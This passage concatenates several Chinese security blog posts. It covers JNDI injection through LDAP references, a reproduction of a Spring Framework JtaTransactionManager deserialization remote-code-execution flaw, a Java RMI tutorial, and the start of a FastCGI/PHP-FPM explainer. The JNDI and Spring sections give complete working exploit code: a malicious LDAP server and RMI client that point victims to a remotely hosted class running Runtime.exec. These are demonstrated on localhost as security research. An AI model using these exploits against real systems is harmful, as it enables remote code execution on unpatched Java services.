的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下： RMI客户端的上下文环境允许访问远程Codebase。 属性 java.rmi.server.useCodebaseOnly 的值必需为false。 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 Changelog: JDK 6u45 https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html JDK 7u21 http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html 这种方法限制很多，不常使用，这里先搞Demo了，意义不大。 漏洞点4——结合反序列化漏洞这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。 具体的例子如Spring Framework的反序列化漏洞，原理和示例看之前的文章就OK了：《由JNDI注入引发的Spring Framework反序列化漏洞》 LDAP攻击向量通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。 LDAP+Reference利用技巧除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。 注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。 所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。 因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的JDk版本是1.8.0_73。 LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public class LdapServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8000/#EvilObject\"; int port = 1234; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; LdapClient.java，LDAP客户端： 1234567891011121314public class LdapClient &#123; public static void main(String[] args) throws Exception&#123; try &#123; Context ctx = new InitialContext(); ctx.lookup(\"ldap://localhost:1234/EvilObject\"); String data = \"This is LDAP Client.\"; //System.out.println(serv.service(data)); &#125; catch (NamingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; EvilObject.java，恶意类，执行弹出计算器： 12345public class EvilObject &#123; public EvilObject() throws Exception &#123; Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 运行结果： CORBA攻击向量利用CORBA攻击向量进行JNDI注入的原理和RMI、LDAP是类似的，限于个人知识的匮乏，暂时写不了这章。 : ( 0x03 绕过高版本JDK（8u191+）限制本部分参考自KINGX大佬的博客：如何绕过高版本JDK的限制进行JNDI注入利用 由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 KINGX提到了如下两种绕过方式： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。 简单地说，就是利用受害者本地ClassPath环境是否存在可被利用的Gadget来进行攻击。 具体的参考后面的一篇文章：浅析高低版JDK下的JNDI注入及绕过 0x04 防御 使用最新的JDK版本； 将外部数据传入InitialContext.lookup()方法前先进行严格的过滤； 使用安全管理器时，需要仔细审计安全策略； 0x05 参考BlackHat2016——JDNI注入/LDAP Entry污染攻击技术研究 Jndi注入及Spring RCE漏洞分析 BlackHat 2016 回顾之 JNDI 注入简单解析 Java代码审计学习之JNDI注入 如何绕过高版本JDK的限制进行JNDI注入利用","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"JNDI注入","slug":"JNDI注入","permalink":"https://www.mi1k7ea.com/tags/JNDI注入/"}]},{"title":"由JNDI注入引发的Spring Framework反序列化漏洞","date":"2019-09-02T12:15:35.000Z","path":"2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/","text":"老早的漏洞了，问题是出在spring-tx-xxx.jar这个包。 0x01 环境搭建直接用的Github的项目：https://github.com/zerothoughts/spring-jndi 下载到本地，导入maven项目即可。 同时，为了顺利复现漏洞，JDK要在以下的版本之下：8u121、7u131、6u141。在上述版本之后的JDK中，都增加了com.sun.jndi.rmi.object.trustURLCodebase选项，其默认禁止RMI和CORBA协议使用远程codebase的选项。 0x02 漏洞复现成功的Demo本次Demo就在Windows上测试，JDK版本为1.7.0_80。 为了方便，小改了下代码。 ExploitableServer.java 存在漏洞的服务端代码，全网监听1234端口，将连接上来的Socket数据流内容进行反序列化操作即readObject()： 12345678910111213141516171819202122public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; ServerSocket serverSocket = new ServerSocket(1234); System.out.println(\"Server started on port \"+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(\"Connection received from \"+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(\"Read object \"+object); &#125; catch(Exception e) &#123; System.out.println(\"Exception caught while reading object\"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ExploitClient.java 先创建注册表并监听在默认的1099端口，然后使用RMI+Reference的方式将referenceWrapper注册到Registry中、其中注册名为Object，然后和目标服务器建立连接，接着新建org.springframework.transaction.jta.JtaTransactionManager实例并调用setUserTransactionName来设置JNDI要查找的RMI服务地址、这里为本程序开启的Registry服务中绑定的object，最后将这个实例对象序列化之后发送给服务端： 12345678910111213141516171819202122232425262728293031public class ExploitClient &#123; public static void main(String[] args) &#123; try &#123; int port = 1234; String localAddress= \"127.0.0.1\"; System.out.println(\"Creating RMI Registry\"); Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new javax.naming.Reference(\"ExportObject\",\"ExportObject\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); Socket socket = new Socket(localAddress,port); System.out.println(\"Connected to server\"); String jndiAddress = \"rmi://\"+localAddress+\":1099/Object\"; org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager(); object.setUserTransactionName(jndiAddress); System.out.println(\"Sending object to server...\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); while(true) &#123; Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; ExportObject.java Reference引用指向的恶意类，这里我们在构造方法中实现运行计算器的功能： 123456789public class ExportObject &#123; public ExportObject() &#123; try &#123; Runtime.getRuntime().exec(\"calc.exe\"); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 先运行目标服务端ExploitableServer，监听着1234端口，其接受Socket数据并进行反序列化操作； 接着将编译后的ExportObject.class放在攻击者的服务器中，这里是Python直接启的Web服务； 最后运行客户端ExploitClient，其先启动Registry并将指向攻击者服务器的ExportObject.class的Reference引用绑定到注册表中，然后将设置里JNDI查询地址为Registry中绑定的object的实例对象序列化后发送给目标服务端程序；而目标服务端程序ExploitableServer接受到客户端ExploitClient发送的数据后，会对数据进行反序列化操作，其中会触发org.springframework.transaction.jta.JtaTransactionManager实例对象自定义的readObject()方法，调用lookup()查询恶意Reference引用指向的攻击者服务器中的ExportObject类，从而任意代码执行。 弹计算器是意料之中的，值得注意的是我本地的JDK版本是1.7.0_80： com.sun.jndi.rmi.object.trustURLCodebase前面说到，在JDK版本8u121、7u131、6u141以后，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false。 下面主要是为了看下高版本的报错情况，环境选在Linux中，其中JDK版本为1.8.0_222。 git clone下项目后，分别输入如下命令来运行服务端和客户端： 1234567cd servermvn installjava -cp \"target/*\" ExploitableServer 9999cd clientmvn install java -cp \"target/*\"\" ExploitClient 127.0.0.1 9999 127.0.0.1 在客户端发送请求之后，在服务端可看到报错信息： 1org.springframework.transaction.TransactionSystemException: JTA UserTransaction is not available at JNDI location [rmi://127.0.0.1:1099/Object]; nested exception is javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &apos;com.sun.jndi.rmi.object.trustURLCodebase&apos; to &apos;true&apos;. 可以看到主要的报错信息就是com.sun.jndi.rmi.object.trustURLCodebase默认为false，其是默认禁止RMI和CORBA协议使用远程codebase的选项，导致我们不能通过低版本中RMI+Reference的方式来实现JNDI注入从而实现触发反序列化漏洞执行任意代码。 0x03 漏洞分析函数调用链分析由前面我们知道，传过去目标服务端进行反序列化操作的是经过序列化的org.springframework.transaction.jta.JtaTransactionManager实例对象，其在传输前还通过调用setUserTransactionName()来设置属性值为某个特定的JNDI。 由前面我们知道，传过去目标服务端进行反序列化操作的是经过序列化的org.springframework.transaction.jta.JtaTransactionManager实例对象，其在传输前还通过调用setUserTransactionName()来设置属性值为某个特定的JNDI。 下面我们跟进org.springframework.transaction.jta.JtaTransactionManager看看它的readObject()方法： 1234567891011private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; // Rely on default serialization; just initialize state after deserialization. ois.defaultReadObject(); // Create template for client-side JNDI lookup. this.jndiTemplate = new JndiTemplate(); // Perform a fresh lookup for JTA handles. initUserTransactionAndTransactionManager(); initTransactionSynchronizationRegistry();&#125; 可以看到JtaTransactionManager类的readObject()方法被重写了，关注到调用了initUserTransactionAndTransactionManager()，跟进去： 123456789101112131415161718192021222324252627282930313233343536protected void initUserTransactionAndTransactionManager() throws TransactionSystemException &#123; if (this.userTransaction == null) &#123; // Fetch JTA UserTransaction from JNDI, if necessary. if (StringUtils.hasLength(this.userTransactionName)) &#123; this.userTransaction = lookupUserTransaction(this.userTransactionName); this.userTransactionObtainedFromJndi = true; &#125; else &#123; this.userTransaction = retrieveUserTransaction(); if (this.userTransaction == null &amp;&amp; this.autodetectUserTransaction) &#123; // Autodetect UserTransaction at its default JNDI location. this.userTransaction = findUserTransaction(); &#125; &#125; &#125; if (this.transactionManager == null) &#123; // Fetch JTA TransactionManager from JNDI, if necessary. if (StringUtils.hasLength(this.transactionManagerName)) &#123; this.transactionManager = lookupTransactionManager(this.transactionManagerName); &#125; else &#123; this.transactionManager = retrieveTransactionManager(); if (this.transactionManager == null &amp;&amp; this.autodetectTransactionManager) &#123; // Autodetect UserTransaction object that implements TransactionManager, // and check fallback JNDI locations otherwise. this.transactionManager = findTransactionManager(this.userTransaction); &#125; &#125; &#125; // If only JTA TransactionManager specified, create UserTransaction handle for it. if (this.userTransaction == null &amp;&amp; this.transactionManager != null) &#123; this.userTransaction = buildUserTransaction(this.transactionManager); &#125;&#125; 分析得知，先判断JtaTransactionManager类的userTransaction属性值是否为空，若为空则进一步判断userTransactionName属性值是否为空，当不为空是则调用lookupUserTransaction(this.userTransactionName)。 进一步跟进lookupUserTransaction()函数： 12345678910111213protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException &#123; try &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Retrieving JTA UserTransaction from JNDI location [\" + userTransactionName + \"]\"); &#125; return getJndiTemplate().lookup(userTransactionName, UserTransaction.class); &#125; catch (NamingException ex) &#123; throw new TransactionSystemException( \"JTA UserTransaction is not available at JNDI location [\" + userTransactionName + \"]\", ex); &#125;&#125; 其中直接调用getJndiTemplate().lookup()函数来查找注册表中的远程对象。为了确认lookup()函数是否是JNDI注入常用的那个，再跟进去： 12345678910111213141516public Object lookup(final String name) throws NamingException &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Looking up JNDI object with name [\" + name + \"]\"); &#125; return execute(new JndiCallback&lt;Object&gt;() &#123; @Override public Object doInContext(Context ctx) throws NamingException &#123; Object located = ctx.lookup(name); if (located == null) &#123; throw new NameNotFoundException( \"JNDI object with [\" + name + \"] not found: JNDI implementation returned null\"); &#125; return located; &#125; &#125;);&#125; 这里就清晰了，这个lookup()函数符合JNDI注入的特征，且参数是JtaTransactionManager类的userTransactionName属性值，而该属性值我们是可以通过调用setUserTransactionName()的方式来设置的。 小结这个漏洞的产生根源是：org.springframework.transaction.jta.JtaTransactionManager类重写了readObject()方法，其中调用了JNDI注入相关的lookup()函数，而lookup()函数的参数userTransactionName为JtaTransactionManager类的属性、是可以通过调用setUserTransactionName()来设置的，从而导致lookup()函数的参数外部可控，当目标服务端进行反序列化操作时就会触发JNDI注入漏洞从而导致任意代码执行。 0x04 参考Spring framework deserialization RCE","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Java RMI原理与使用","date":"2019-09-01T11:05:16.000Z","path":"2019/09/01/Java-RMI原理与使用/","text":"0x01 何为RMIRMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如CORBA、WebService，这两种都是独立于各个编程语言的。 而Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。 在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。所以平时说的反序列化漏洞的利用经常是涉及到RMI，就是这个意思。 RMI依赖的通信协议为JRMP（Java Remote Message Protocol，Java远程消息交换协议），该协议是为Java定制的，要求服务端与客户端都必须是Java编写的。 0x02 RMI的模式与交互过程设计模式RMI的设计模式中，主要包括以下三个部分的角色： Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。 Server：远程方法的提供者，并向Registry注册自身提供的服务 Client：远程方法的消费者，从Registry获取远程方法的相关信息并且调用 交互过程RMI交互过程如图所示： 在设计模式中，3个角色是的交互过程可简单概述为： 首先，启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）； 其次，Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称； 最后，Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称），使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Service那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了； 此外，我们可以看到，从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。 下面详细说下其中几个重要的概念。 远程对象在RMI中的核心就是远程对象，一切都是围绕这个东西来进行的。 顾名思义，远程对象是存在于服务端以供客户端调用的对象。任何可以被远程调用的对象都必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。这个远程对象中可能有很多个函数，但是只有在远程接口中声明的函数才能被远程调用，其他的公共函数只能在本地的JVM中使用。 使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。 RMI注册表 Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。 Stub和SkeletonRMI采用代理来负责客户与远程对象之间通过Socket进行通信的细节，主要是为远程对象分别生成了客户端代理和服务端代理，其中位于客户端的代理类称为Stub即存根，位于服务端的代理类称为Skeleton即骨干网。 Stub和Skeleton的具体通信过程如图： 方法调用从客户端对象经存根（Stub）、远程引用层（Remote Reference Layer）和传输层（Transport Layer）向下，传递给主机，然后再次经传输层，向上穿过远程调用层和骨干网（Skeleton），最终到达服务器对象。 Stub存根：扮演着远程服务器对象的代理的角色，使该对象可被客户激活。 远程引用层：处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。 传输层：管理实际的连接，并且追踪可以接受方法调用的远程对象。 Skeleton骨干网：完成对服务器对象实际的方法调用，并获取返回值。 返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根获得返回值。 工厂模式和代理模式代理模式前面已经说了，这里主要是工厂模式。 如图，先假设： 有两个远程服务接口可供Client调用，Factory和Product接口 FactoryImpl类实现了Factory接口，ProductImpl类实现了Product接口 工厂模式的处理流程为： FactoryImpl被注册到了RMI Registry中； Client端请求一个Factory的引用； RMI Registry返回Client端一个FactoryImpl的引用； Client端调用FactoryImpl的远程方法请求一个ProductImpl的远程引用； FactoryImpl返回给Client端一个ProductImpl引用； Client通过ProductImpl引用调用远程方法； 可以看到，客户端向注册表请求获取到指定的FactoryImpl的引用后，再通过调用FactoryImpl的远程方法请求一个ProductImpl的远程引用，从而调用到ProductImpl引用指向的远程方法。 这种RMI+Reference的技术在JNDI注入中是单独作为一种利用方式。 0x03 java.rmi包简介Remote一个interface，这个interface中没有声明任何方法。只有定义在“remote interface”，即继承了Remote的接口中的方法，才可以被远程调用。 RemoteExceptionRemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。 Naming提供向注册中心保存远程对象引用或者从注册中心获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如://host:port/name。 Registry一个interface, 其功能和Naming类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法LocateRegistry.getRegistry()获得。 LocateRegistry用于获取到注册中心的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。 RemoteObject重新覆写了Object对象中的equals,hashCode,toString方法，从而可以用于远程调用。 UnicastRemoteObject用于RMI Server中导出一个远程对象并获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。 Unreferenced一个interface, 声明了方法：void unreferenced()如果一个远程队形实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。 0x04 动态类加载 RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 在JNDI注入和反序列化漏洞的利用中，正是涉及到了动态类加载。 0x05 编写RMI的步骤RMI程序的编写主要分为以下几个步骤。 定义服务端供远程调用的类在此之前先定义一个可序列化的Model层的用户类，其实例可放置于服务端进行远程调用： 12345678910111213141516171819202122232425262728293031import java.io.Serializable;public class PersonEntity implements Serializable &#123; private int id; private String name; private int age; public void setId(int id) &#123; this.id = id; &#125; public int getId() &#123; return id; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; 定义一个远程接口远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误： 1234567import java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface PersonService extends Remote &#123; public List&lt;PersonEntity&gt; GetList() throws RemoteException;&#125; 开发接口的实现类建立PersonServiceImpl实现远程接口，注意此为远程对象实现类，需要继承UnicastRemoteObject（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）： 1234567891011121314151617181920212223242526272829303132import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.LinkedList;import java.util.List;public class PersonServiceImpl extends UnicastRemoteObject implements PersonService &#123; public PersonServiceImpl() throws RemoteException &#123; super(); // TODO Auto-generated constructor stub &#125; @Override public List&lt;PersonEntity&gt; GetList() throws RemoteException &#123; // TODO Auto-generated method stub System.out.println(\"Get Person Start!\"); List&lt;PersonEntity&gt; personList = new LinkedList&lt;PersonEntity&gt;(); PersonEntity person1 = new PersonEntity(); person1.setAge(3); person1.setId(0); person1.setName(\"mi1k7ea\"); personList.add(person1); PersonEntity person2 = new PersonEntity(); person2.setAge(18); person2.setId(1); person2.setName(\"Alan\"); personList.add(person2); return personList; &#125;&#125; 创建Server和Registry其实Server和Registry可以单独运行创建，其中Registry可通过代码启动也可通过rmiregistry命令启动，这里只进行简单的演示，将Server和Registry的创建、对象绑定注册表等都写到一块，且Registry直接代码启动： 123456789101112131415161718import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class Program &#123; public static void main(String[] args) &#123; try &#123; PersonService personService=new PersonServiceImpl(); //注册通讯端口 LocateRegistry.createRegistry(6600); //注册通讯路径 Naming.rebind(\"rmi://127.0.0.1:6600/PersonService\", personService); System.out.println(\"Service Start!\"); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 创建客户端并查找调用远程方法这里我们通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来： 1234567891011121314151617import java.rmi.Naming;import java.util.List;public class Client &#123; public static void main(String[] args)&#123; try&#123; //调用远程对象，注意RMI路径与接口必须与服务器配置一致 PersonService personService=(PersonService) Naming.lookup(\"rmi://127.0.0.1:6600/PersonService\"); List&lt;PersonEntity&gt; personList=personService.GetList(); for(PersonEntity person:personList)&#123; System.out.println(\"ID:\"+person.getId()+\" Age:\"+person.getAge()+\" Name:\"+person.getName()); &#125; &#125;catch(Exception ex)&#123; ex.printStackTrace(); &#125; &#125;&#125; 最后，我们看下模拟运行的场景。 先启动Server和Register，开启成功后显示“Server Start!”，然后运行我们的Client程序，可以看到客户端成功获取到了在Register注册的Server中的远程对象的内容： 当然，写法有很多，还可以参考这个不一样写法的Demo：https://blog.csdn.net/qq_28081453/article/details/83279066 几个函数这里小结下几个函数： bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果改名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误； rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象； lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象； unbind(String name)：注销对象，取消对象与名字的绑定； 0x06 参考java rmi 使用教程及原理 Java RMI原理与使用 JAVA RMI 原理和使用浅析 学习笔记：JAVA RMI远程方法调用简单实例 深入理解JNDI注入与Java反序列化漏洞利用","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅谈PHP-FPM安全","date":"2019-08-25T10:58:52.000Z","path":"2019/08/25/浅谈PHP-FPM安全/","text":"0x01 PHP连接模式PHP中连接模式主要有以下三种。 apache2-module模式这种模式下，是将PHP当做Apache的一个模块，此时PHP就是Apache中的一个DLL文件或SO文件。 在phpStudy中，非nts的模式就是默认以apache2-module为连接模式。 CGI模式CGI连接模式下，PHP是作为一个独立的进程，如单独运行一个php-cgi.exe的进程，而此时Web服务器也是独立的一个进程如运行apache.exe。 当Web服务器收到HTTP请求时，就会去调用php-cgi进程，通过CGI协议，服务器把请求内容转换成php-cgi能读懂的协议数据传递给CGI进程，CGI进程拿到内容就会去解析对应PHP文件，得到的返回结果再返回给Web服务器，最后再由Web服务器返回到客户端。 但由于CGI模式下，每次客户端发起请求都需要建立和销毁进程，从而导致很大的资源消耗。因为HTTP要生成一个动态页面，系统就必须启动一个新的进程以运行CGI程序，不断地fork是一项很消耗时间和资源的工作。因此，也就诞生了FastCGI模式。 FastCGI模式FastCGI模式是CGI模式的优化升级版，主要解决了CGI模式性能不佳的问题。 FastCGI其实是一个协议，是在CGI协议上进行了一些优化。众所周知，CGI进程的反复加载是CGI性能低下的主要原因，如果CGI解释器能够保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over特性等等，而这些改进正是FastCGI所提供的。 简而言之，CGI模式是Apache2接收到请求去调用CGI程序，而FastCGI模式是FastCGI进程自己管理自己的CGI进程，而不再是Apache去主动调用CGI进程，而FastCGI进程又提供了很多辅助功能比如内存管理、垃圾处理、保障了CGI的高效性，并且此时CGI是常驻在内存中、不会每次请求重新启动，从而使得性能得到质的提高。 如何识别那么对于一个PHP Web服务，我们如何去识别它的PHP连接模式是哪个呢？ 在接触不到服务器文件的情况下，最简单的办法就是查看phpinfo： apache2-module模式： CGI模式： FastCGI模式： 0x02 FastCGI基本概念前面说了，FastCGI其实是一个协议，和HTTP协议一样，都是用于数据交互的一个通道。 HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。 类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。 协议分析具体的参考P牛的博客：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html record 下面我们看下FastCGI协议的record结构是怎样的，这里的直接引用自P牛博客的内容： 和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下： 12345678910111213141516&gt; typedef struct &#123;&gt; /* Header */&gt; unsigned char version; // 版本&gt; unsigned char type; // 本次record的类型&gt; unsigned char requestIdB1; // 本次record对应的请求id&gt; unsigned char requestIdB0;&gt; unsigned char contentLengthB1; // body体的大小&gt; unsigned char contentLengthB0;&gt; unsigned char paddingLength; // 额外块大小&gt; unsigned char reserved; &gt; &gt; /* Body */&gt; unsigned char contentData[contentLength];&gt; unsigned char paddingData[paddingLength];&gt; &#125; FCGI_Record;&gt; 头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。 